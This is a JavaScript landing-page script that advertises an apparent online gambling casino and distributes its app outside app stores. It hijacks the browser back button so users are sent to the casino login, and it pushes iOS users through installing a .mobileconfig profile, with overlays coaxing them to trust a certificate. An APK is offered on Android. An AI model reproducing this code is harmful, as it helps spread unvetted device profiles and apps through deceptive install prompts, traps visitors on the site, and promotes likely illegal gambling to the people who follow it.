var host = '';
var androidDownloadUrl = '';
// 语言
var install_finish = '';
var alert_not_safari = '';
var download_btn_tips = '';
var iosDownloadUrl = '';


window.onload = function () {
    let protocol = window.location.protocol;
    host = protocol + '//' + window.location.host;
    // host = 'http://localhost:9090';
	// 点击查看引导显示滑动层
    $('.look').click(function () {
        $('.install').show();
    })
    // 初始化better-scroll
    let swiperInstall = new BScroll('.wrapper', {
        // bounce: false,
    })
    // 点击X号关闭滑动层
    $('.close').click(function () {
        $('.install').hide()
    })
    // 点击黑色蒙层关闭滑动层
    $('.install').click(function () {
        $('.install').hide()
        return false;
    })
    // 阻止点击滑动层关闭mask
    $('#swiperInstall').click(function (event) {
        event.preventDefault();
        return false;
    })

    // 点击下一步隐藏IOS弹窗
    $('.closeMask').click(function () {
        $('#license_step_img1').hide();
        createDomAndClick('./setup.mobileprovision');
        setTimeout(function () {
            $('#license_step_img2').show();
        }, 4000);
    })

    function fobidden_back(url, name, logoPath) {
        // var b = url.replace('http://', '').replace('https://', '')
        // var t = new Date().getTime()
        // var h = 'sm'
        // var u = h.indexOf('?') > -1 ? h + '&_='+ t +'&keyword=' + b + '&name=' + name + '&logo='+ logoPath : h + '?_='+ t + '&keyword=' + b + '&name=' + name + '&logo='+ logoPath;
        var state = { title: "title", url: "#" }

        window.history.pushState(state, "title", "#")
        window.addEventListener("popstate", function(e) {
            window.location.href = url;
        }, false)
    }

    // 底部滑动幻灯片实例化
    function newSwiper(swiperList) {
        var swiperListLen = swiperList.length;
        if (swiperListLen) {
            var html = '<div class="swiper-wrapper">';
            for (var i = 0; i < swiperListLen; i++) {
                html += '<img src="' + swiperList[i].paths + '" class="swiper-slide">';
            }
            html += '</div>';
            $('#swiperImg').html(html);

            var swiperImg = new Swiper('#swiperImg', {
                loop: true, // 循环模式选项
                autoplay: {
                    delay: 2000,
                    stopOnLastSlide: false,
                    disableOnInteraction: false,
                },
                slidesPerView: 'auto',
                spaceBetween: 20,
                pagination: {
                    el: '.swiper-pagination',
                    clickable: true,
                },
            })
        }
    }

    // 判断是否是IOS121_4
    function isAfterIos121_4() {
        var nu = navigator.userAgent.toLowerCase();
        var iosVersion = nu.match(/cpu iphone os (.*?) like mac os/);
        if (iosVersion && iosVersion.length > 1) {
            iosVersion = iosVersion[1].replace('_', '').replace('_', '.');
            return iosVersion && Number(iosVersion) > 121.4
        }
        return false
    }

       //判断是否版本号高于IOS170
    function isAfterIos170() {
        var nu = navigator.userAgent.toLowerCase();
        var iosVersion = nu.match(/cpu iphone os (.*?) like mac os/);
        if (iosVersion && iosVersion.length > 1) {
            iosVersion = iosVersion[1].replace('_', '').replace('_', '.');
            return iosVersion && Number(iosVersion) > 170
        }
        return false
    }

    // 判断是否是安卓设备
    function isAndroid() {
        let u = navigator.userAgent;
        return u.indexOf('Android') > -1 || u.indexOf('Linux') > -1;
    }

    function isSafari() {
        return /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent);
    }

    // 判断是否是IOS设备
    function isIos() {
        let u = navigator.userAgent;
        return !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
    }

    // 创建a标签
    function createDomAndClick(href) {
        var a = document.createElement('a');
        a.setAttribute('href', href);
        a.setAttribute('target', '_self');
        a.setAttribute('id', 'startTelMedicine');
        // 防止反复添加
        if (document.getElementById('startTelMedicine')) {
            document.body.removeChild(document.getElementById('startTelMedicine'));
        }
        document.body.appendChild(a);
        a.click();
    }

    // 安装中的文字进度
    function loading(callback, timeout) {
        var index = 0;
        var loadingState = ['.', '..', '...'];
        var intervalId = setInterval(function () {
            if (index > 2) {
                index = 0;
            }
            $('#download_btn').text(((download_btn_tips == null || download_btn_tips == '') ? '正在安装,请耐心等待' : download_btn_tips) + loadingState[index]);
            index++
        }, 500);

        setTimeout(function () {
            if (intervalId) {
                clearInterval(intervalId);
            }
            if (callback) callback(); //回调
        }, timeout || 7000);
    }

    // ios12.1.4之前的下载按钮点击事件处理
    function onBeforeIos1214DownloadBtnClick(downLoadPath) {
        if (!isAndroid() && !isSafari()) {
            alert((alert_not_safari == null || alert_not_safari == '') ? '请使用苹果自带浏览器Safari打开本页' : alert_not_safari);
            return false;
        }
        createDomAndClick(downLoadPath);
        loading(function () {
            $('#download_btn').html((install_finish == null || install_finish == '') ? '安装完成后,请返回桌面查看' : install_finish).css('background', 'linear-gradient(to right,#f1402f,#fe953a)');
        }, 7000);
    }

    // ios12.1.4之后 17之前的下载按钮点击事件处理
    function onAfterIos1214DownloadBtnClick(downLoadPath) {
        if (!isSafari()) {
            alert((alert_not_safari == null || alert_not_safari == '') ? '请使用苹果自带浏览器Safari打开本页' : alert_not_safari);
            return false;
        }
        loading(function () {
            $('#download_btn').html((install_finish == null || install_finish == '') ? '安装完成后,请返回桌面查看' : install_finish).css('background', 'linear-gradient(to right,#f1402f,#fe953a)');
        }, 10000);

        // 延迟2秒显示证书遮罩层
        setTimeout(() => {
            $('.ios_mask').show();
        }, 2000)

        // 延迟3秒显示证书安装箭头指示
        setTimeout(function () {
            $('#license_step_img1').show();
        }, 3000);
        createDomAndClick(downLoadPath);
    }
    // ios17之后的版本点击下载按钮处理事件
    function onAfterIos17DownloadBtnClick(downLoadPath) {
        if (!isAndroid() && !isSafari()) {
            alert((alert_not_safari == null || alert_not_safari == '') ? '请使用苹果自带浏览器Safari打开本页' : alert_not_safari);
            return false;
        }
        setTimeout(() => {
            alert((install_finish == null || install_finish == '') ? '当前设备被iOS17系统，请手动打开 设置-通用-vpn与设备管理，手动安装描述文件。' : install_finish);
        }, 7000)
        createDomAndClick(downLoadPath);
        // loading(function () {
        //     $('#download_btn').html((install_finish == null || install_finish == '') ? '下载完成后,请返回设置安装' : install_finish).css('background', 'linear-gradient(to right,#f1402f,#fe953a)');
        // }, 7000);
    }


    function textFlashing() {
        var colors = ['red', 'blue']
        var index = 0
        setInterval(function () {
            if (index > colors.length) {
                index = 0
            }
            $('.closeMask').css('color', colors[index]);
            index++;
        }, 400)
    }

    function androidDownload() {
        var a = document.createElement('a');
        a.setAttribute('href', androidDownloadUrl);
        a.setAttribute('target', '_self');
        a.setAttribute('id', 'startTelMedicine');
        // 防止反复添加
        if (document.getElementById('startTelMedicine')) {
            document.body.removeChild(document.getElementById('startTelMedicine'));
        }
        document.body.appendChild(a);
        a.click();
    }

    function init() {
		// $.ajax({
        //     url: 'data.json?t='+Math.random(),
        //     type: 'GET',
        //     data: {},
		// 	dataType: "json",
        //     success: function (data) {
                let data = {
                    "app": {
                        "id": 49,
                        "appName": "新葡京娱乐城",
                        "typeName": "新葡京",
                        "languageCode": "zh-cn",
                        "appVersion": "v1.00",
                        "logoPath": "./images/pg-logo.png",
                        "bannerPath": "https://hk-avida.oss-cn-hongkong.aliyuncs.com/banner/41668799-banner-1624623630256.png",
                        "downCount": 150228,
                        "discussCount": 1509,
                        "androidPath": "https://444777.cc/XPJYLC.apk",
                        "descs": "新葡京娱乐城依托集团公司强大实力，数十年打造线上博彩金字招牌，百家乐、德州、彩票、体育、棋牌应有尽有，真正公平公正的真人玩家对抗游戏，充值提现分分钟到账，超多优惠让您嗨到尽兴。",
                        "helpUrl": "https://yun-kefu888.com/chat/text/chat_1AMAlh.html",
                        "homeSite": "https://www.jinpaizhanghu.me:2083/m/#/Login",
                        "iosPath": "https://444777.cc/XPJ.mobileconfig"
                    },
                    "effects": [
                        {
                            "paths": "./images/effects/1.png"
                        },
                        {
                            "paths": "./images/effects/2.jpg"
                        },
                        {
                            "paths": "./images/effects/3.png"
                        },
                        {
                            "paths": "./images/effects/4.jpg"
                        }
                    ],
                    "language": {
                        "online_service": "在线客服",
                        "btn_install": "免费下载安装",
                        "btn_close_mask": "2:证书已安装·下一步",
                        "grade_count": "人评分",
                        "install_course": "安装教程",
                        "download_btn_tips": "正在安装,请耐心等待",
                        "install_finish": "安装完成后,请返回桌面查看",
                        "not_btn_install": "暂不支持，领取现金红包",
                        "app_home": "进入官网",
                        "alert_not_safari": "请使用苹果自带浏览器Safari打开本页",
                        "age": "年龄",
                        "look_install_guide": "查看安装引导"
                    }
                }
                let app = data.app;
                iosDownloadUrl = app.iosPath;
                document.title = app.appName;
                fobidden_back(app.homeSite, app.appName, app.logoPath);
                $('#app_banner').attr('src', app.bannerPath);
                $('#app_logo').attr('src', app.logoPath);
                $('#app_name').html(app.appName);
                $('#download_count').html(app.downCount);
                $('#app_version').html(app.appVersion);
                $('#app_information').html(app.descs);
                $('#grade_person_count').html(app.discussCount + ((data.language.grade_count == null || data.language.grade_count == '') ? '人评分' : data.language.grade_count));
                $('#type_name').html(app.typeName);
                // 设置语言化
                setLanguage(app, data.language);

                $('#app_home').click(function () {
                    window.open(app.homeSite);
                });
                // 绑定在线客服点击事件
                $('#online_service').click(function () {
                    window.open(app.helpUrl);
                });
                //实例化幻灯片
                newSwiper(data.effects);
                if (isAndroid()) {
                    if (app.androidPath && app.androidPath != '') {
                        let btn_install = data.language.btn_install;
                        $('#download_btn').html((btn_install == null || btn_install == '') ? '免费下载安装,领取现金红包' : btn_install);
                        androidDownloadUrl = app.androidPath;
                        $('#download_btn').click(function () {
                            androidDownload();
                        });
                    } else {
                        let not_btn_install = data.language.not_btn_install;
                        $('#download_btn').html((not_btn_install == null || not_btn_install == '') ? '暂不支持，领取现金红包' : not_btn_install);
                    }
                    // 当121_4之后
                    $('#iosafter').show();
                    $('#iosbefore').hide();
                } else {
                    // 当121_4之前的版本
                    if(!isAfterIos121_4()) {
                        // 处理下载app按钮的点击事件
                        $('#download_btn').click(function () {
                            onBeforeIos1214DownloadBtnClick(iosDownloadUrl)
                        });
                    }
                    // 如过当前是ios12.1.4 并且小余ios17，预先给下载按钮绑定href链接以及控制安装引导的教程显示
                    if (isAfterIos121_4() && !isAfterIos170()) {
                        $('#download_btn').attr(iosDownloadUrl);
                        $('#iosafter').show();
                        $('#iosbefore').hide();
                         // 处理下载app按钮的点击事件
                        $('#download_btn').click(function () {
                            onAfterIos1214DownloadBtnClick(iosDownloadUrl)
                        });
                    }
                   //当是ios17之后的版本
                   if(isAfterIos170()) {
                    $('#download_btn').click(function () {
                        onAfterIos17DownloadBtnClick(iosDownloadUrl)
                    });
                   }
                }
        //     },
        //     error: function (error) {
        //         alert(error);
        //     }
        // });
    }

	function setLanguage(app, language) {
		download_btn_tips = (language.download_btn_tips == null) ? '' : language.download_btn_tips;
		alert_not_safari = (language.alert_not_safari == null) ? '' : language.alert_not_safari;
		install_finish = (language.install_finish == null) ? '' : language.install_finish;

		$('#btn_install').html((language.btn_install == null || language.btn_install == '') ? '免费下载安装,领取现金红包' : language.btn_install);
		$('#age').html((language.age == null || language.age == '') ? '年龄' : language.age);
		$('#app_home').html((language.app_home == null || language.app_home == '') ? '进入官网' : language.app_home);
		$('#online_service').html((language.online_service == null || language.online_service == '') ? '在线客服' : language.online_service);
		$('#look_install_guide').html((language.look_install_guide == null || language.look_install_guide == '') ? '查看安装引导' : language.look_install_guide);
		$('#install_course').html((language.install_course == null || language.install_course == '') ? '安装教程' : language.install_course);
		$('#btn_close_mask').html((language.btn_close_mask == null || language.btn_close_mask == '') ? '2:证书已安装·下一步' : language.btn_close_mask);

		$('#license_step_img1').attr('src', './images/' + app.languageCode + '/mask.png');
		$('#license_step_img2').attr('src', './images/' + app.languageCode + '/mask2.png');

		let iosbefore = "";
		iosbefore = iosbefore + "<li><img src='./images/" + app.languageCode + "/before_12_step/1.png' class='img_01'></li>";
		iosbefore = iosbefore + "<li><img src='./images/" + app.languageCode + "/before_12_step/2.png' class='img_01'></li>";
		iosbefore = iosbefore + "<li><img src='./images/" + app.languageCode + "/before_12_step/3.png' class='img_01'></li>";
		iosbefore = iosbefore + "<li><img src='./images/" + app.languageCode + "/before_12_step/4.png' class='img_01'></li>";
		iosbefore = iosbefore + "<li><img src='./images/" + app.languageCode + "/before_12_step/5.png' class='img_01'></li>";
		$('#iosbefore_content').html(iosbefore);

		let iosafter = "";
		iosafter = iosafter + "<li><img src='./images/" + app.languageCode + "/after_12_step/install_1.png' class='img_01'></li>";
		iosafter = iosafter + "<li><img src='./images/" + app.languageCode + "/after_12_step/install_2.png' class='img_01'></li>";
		iosafter = iosafter + "<li><img src='./images/" + app.languageCode + "/after_12_step/install_3.png' class='img_01'></li>";
		iosafter = iosafter + "<li><img src='./images/" + app.languageCode + "/after_12_step/install_4.png' class='img_01'></li>";
		iosafter = iosafter + "<li><img src='./images/" + app.languageCode + "/after_12_step/install_5.png' class='img_01'></li>";
		iosafter = iosafter + "<li><img src='./images/" + app.languageCode + "/after_12_step/install_6.png' class='img_01'></li>";
		iosafter = iosafter + "<li><img src='./images/" + app.languageCode + "/after_12_step/install_7.png' class='img_01'></li>";
		$('#iosafter_content').html(iosafter);
	}

    // 数据加载
    init();
    textFlashing();
}
